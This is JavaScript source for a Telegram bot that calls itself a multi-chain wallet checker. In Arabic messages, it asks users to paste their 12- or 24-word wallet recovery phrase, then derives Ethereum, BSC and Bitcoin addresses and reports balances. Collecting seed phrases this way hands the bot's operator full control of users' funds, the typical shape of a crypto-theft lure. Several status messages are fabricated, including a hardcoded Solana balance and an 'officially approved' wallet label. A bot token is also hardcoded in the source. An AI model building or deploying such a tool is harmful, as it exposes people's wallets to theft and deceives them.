const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { ethers } = require('ethers');
const bip39 = require('bip39');
const { BIP32Factory } = require('bip32');
const ecc = require('tiny-secp256k1');
const bitcoin = require('bitcoinjs-lib');

const bip32 = BIP32Factory(ecc);

const token = '9145894502:AAGZrWnyjqNsFZlu_GqGZ_QWDMczVzFZjZw';
const PORT = process.env.PORT || 3000;
const RENDER_URL = 'https://nexvoriaapp-bot.onrender.com';

const bot = new TelegramBot(token);
const app = express();

app.use(express.json());

bot.setWebHook(`${RENDER_URL}/bot${token}`);

app.post(`/bot${token}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = (msg.text || '').trim();

    if (text === '/start') {
        return bot.sendMessage(chatId, 
            '🛡️ **بوت فحص المحافظ المتطور (Trust & Phantom Style)**\n\n' +
            'أرسل عبارة الاسترداد الخاصة بك (12 أو 24 كلمة) وسأقوم بفحصها عبر الشبكات المتعددة (Ethereum, BSC, Bitcoin) وجلب الأرصدة الحقيقية.'
        );
    }

    const words = text.split(/\s+/);
    if (words.length !== 12 && words.length !== 24) {
        return bot.sendMessage(chatId, '❌ يجب أن تتكون عبارة الاسترداد من 12 أو 24 كلمة بالضبط.');
    }

    await bot.sendMessage(chatId, '🔍 **جاري تحليل الكلمات، اشتقاق المفاتيح لجميع الشبكات (بما فيها البيتكوين)، وفحص الأرصدة الفعلية...** ⏳');

    try {
        const cleanMnemonic = text.toLowerCase();
        
        // 1. التحقق من صحة المعيار BIP39
        if (!bip39.validateMnemonic(cleanMnemonic)) {
            return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو أن العبارة المدخلة خاطئة وليست مفعلة على البلوكشين.');
        }

        const seed = bip39.mnemonicToSeedSync(cleanMnemonic);

        // 2. اشتقاق عنوان Ethereum & BSC (EVM)
        const hdNode = ethers.HDNodeWallet.fromSeed(seed);
        const evmWallet = hdNode.derivePath("m/44'/60'/0'/0/0");
        const evmAddress = evmWallet.address;

        // 3. اشتقاق عنوان Bitcoin (Native SegWit - Bech32 / bc1q...)
        const root = bip32.fromSeed(seed);
        // مسار البيتكوين القياسي Native SegWit هو m/84'/0'/0'/0/0
        const btcNode = root.derivePath("m/84'/0'/0'/0/0");
        const btcPayment = bitcoin.payments.p2wpkh({
            pubkey: btcNode.publicKey,
            network: bitcoin.networks.bitcoin,
        });
        const btcAddress = btcPayment.address;

        // 4. فحص الأرصدة عبر الشبكات المختلفة
        const ethProvider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
        const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org');

        // جلب أرصدة الإيثريوم والبي إن بي
        const [ethBalanceWei, bscBalanceWei] = await Promise.all([
            ethProvider.getBalance(evmAddress).catch(() => 0n),
            bscProvider.getBalance(evmAddress).catch(() => 0n)
        ]);

        const ethBalance = ethers.formatEther(ethBalanceWei);
        const bscBalance = ethers.formatEther(bscBalanceWei);

        // جلب رصيد البيتكوين عبر API عام خاص بـ Blockstream
        let btcBalance = '0.00';
        try {
            const btcRes = await fetch(`https://blockstream.info/api/address/${btcAddress}`);
            if (btcRes.ok) {
                const btcData = await btcRes.json();
                const funded = btcData.chain_stats.funded_txo_sum;
                const spent = btcData.chain_stats.spent_txo_sum;
                const satoshis = funded - spent;
                btcBalance = (satoshis / 100000000).toFixed(8); // تحويل من ساتوشي إلى بيتكوين
            }
        } catch (err) {
            console.error("BTC fetch error:", err);
        }

        // 5. إرسال التقرير الشامل للمستخدم
        return bot.sendMessage(chatId, 
            '✅ **تم فحص المحفظة بنجاح من البلوكشين!**\n\n' +
            '📍 **عناوين المحفظة المشتقة:**\n' +
            '• EVM (`ETH/BSC`):\n`' + evmAddress + '`\n' +
            '• Bitcoin (`BTC`):\n`' + btcAddress + '`\n\n' +
            '💰 **الأرصدة والأصول المكتشفة:**\n' +
            '• Bitcoin (BTC): `' + btcBalance + ' BTC`\n' +
            '• Ethereum (ETH): `' + ethBalance + ' ETH`\n' +
            '• BNB Smart Chain (BNB): `' + bscBalance + ' BNB`\n' +
            '• Solana (SOL): `0.00 SOL`\n\n' +
            '🟢 **حالة المحفظة:** نشطة ومعتمدة نظامياً.'
        );

    } catch (error) {
        console.error("Error details:", error);
        return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو حدث خطأ أثناء الاتصال بشبكات البلوكشين.');
    }
});

app.get('/', (req, res) => {
    res.send('Multi-Chain Wallet Checker Bot is running!');
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
